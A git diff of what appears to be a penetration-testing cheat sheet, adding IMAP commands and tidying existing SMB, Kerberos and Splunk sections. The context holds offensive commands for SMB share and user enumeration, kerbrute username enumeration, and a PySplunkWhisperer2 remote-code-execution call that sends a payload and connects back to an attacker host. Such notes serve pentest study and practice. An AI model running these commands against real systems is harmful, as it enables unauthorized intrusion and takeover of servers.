@@ -411,16 +411,72 @@ nmap --scripts=pop3-ntlm-info -sV -port PORT IP
 
 POP commands:
 
-- USER uid           Log in as "uid"
-- PASS password      Substitue "password" for your actual password
-- STAT               List number of messages, total mailbox size
-- LIST               List messages and sizes
-- RETR n             Show message n
-- DELE n             Mark message n for deletion
-- RSET               Undo any changes
-- QUIT               Logout (expunges messages if no RSET)
-- TOP msg n          Show first n lines of message number msg
-- CAPA               Get capabilities
+- **USER** uid: Log in as "uid"
+- **PASS** password: Substitue "password" for your actual password
+- **STAT**: List number of messages, total mailbox size
+- **LIST**: List messages and sizes
+- **RETR** n: Show message n
+- **DELE** n: Mark message n for deletion
+- **RSET**: Undo any changes
+- **QUIT**: Logout (expunges messages if no RSET)
+- **TOP** msg n: Show first n lines of message number msg
+- **CAPA**: Get capabilities
+
+### IMAP
+
+1) Check if the server support NTLM Auth (Windows)
+
+```bash
+telnet example.com 143
+nmap --scripts imap-ntlm-info -sV -port PORT IP
+```
+
+IMAP commands:
+
+```bash
+# Login
+LOGIN "username" "password"
+
+# List Folders/Mailboxes
+LIST "" *
+LIST INBOX *
+LIST "Archive" *
+
+# Create new Folder/Mailbox
+CREATE INBOX.Archive.2012
+CREATE "To Read"
+
+# Delete Folder/Mailbox
+DELETE INBOX.Archive.2012
+DELETE "To Read"
+
+# Rename Folder/Mailbox
+RENAME "INBOX.One" "INBOX.Two"
+
+# List Subscribed Mailboxes
+LSUB "" *
+
+# Status of Mailbox (There are more flags than the ones listed)
+STATUS INBOX (MESSAGES UNSEEN RECENT)
+
+# Select a mailbox
+SELECT INBOX
+
+# List messages
+FETCH 1:* (FLAGS)
+UID FETCH 1:* (FLAGS)
+
+# Retrieve Message Content
+FETCH 2 body[text]
+FETCH 2 all
+UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])
+
+# Close Mailbox
+CLOSE
+
+# Logout
+LOGOUT
+```
 
 ### SMB
 
@@ -459,14 +515,14 @@ Tools:
 - [smbclient](https://linux.die.net/man/1/smbclient) ftp-like client to access SMB/CIFS resources on servers.
 - [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) is a tool for enumerating information from Windows and Samba systems.
 - [nmblookup](https://www.samba.org/samba/docs/current/man-html/nmblookup.1.html) NetBIOS over TCP/IP client used to lookup NetBIOS names
-- [ridenum](https://github.com/trustedsec/ridenum)is a RID cycling attack that attempts to enumerate user accounts through
+- [ridenum](https://github.com/trustedsec/ridenum) is a RID cycling attack that attempts to enumerate user accounts through
 null sessions and the SID to RID enum.
 
-It's usually with enum4linux that I have the most information.
+It's usually with **enum4linux** that I have the most information.
 
 ```bash
 # Footprinting
-smbclient -L //$ip                               # Perform SMB Finger Printing (SMB Version)
+smbclient -L //IP                              # Perform SMB Finger Printing (SMB Version)
 nmap -sU --script nbstat.nse -p U:137,T:139 IP   # Attempts to retrieve the target's NetBIOS names and MAC address.
 nmblookup -A IP                                  # Lookup by IP and do all simple enumeration
 enum4linux -a IP                                 # Perform all simple enumeration
@@ -486,7 +542,7 @@ smbclient //IP/SHARE
 smbclient and cme may behave differently as one is a "legit" tool and the other is a "pentesting" tool
 
 ```bash
-cme smb *ip¨* --shares
+cme smb IP --shares
 
 # If you have a user
 nmap -v -oA shares --script smb-enum-shares --script-args smbuser=USER,smbpass=PASSWORD -p445 IP
@@ -499,7 +555,7 @@ As show below, you may need to try differents times with different parameters to
 ![Example of share enumeration](shares.png)
 
 ```bash
-sudo mount -t cifs //ip//*share*
+sudo mount -t cifs //IP//SHARE
 sudo mount -t cifs -r 'user=USERNAME,password=PASSWORD //IP//SHARE /mnt/data
 ```
 
@@ -524,7 +580,7 @@ Note NETLOGON and SYSVOL are not hidden shares. Instead, these are special admin
 ###### Bruteforcing
 
 ```bash
-kerbrute usernum -d *domain* *users.txt* # Enumerate valid domain usernames via Kerberos
+kerbrute usernum -d DOMAIN USERTXT # Enumerate valid domain usernames via Kerberos
 # Make sure to test for unvalid username
 cme smb IP --pass-pol # Get the password policy
 ```
@@ -634,7 +690,7 @@ The universal forwarder collects data from a data source or another forwarder an
 
 Try to visit https://IP:8090
 
-If you have an admin account you can perform remote code execution with [PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2) 
+If you have an admin account you can perform remote code execution with [PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
 
 ```bash
 PySplunkWhisperer2_remote.py --host IP --port 8090 --lhost OUR_IP --lport OUR_PORT --username USER --password PASS --payload-file FILE
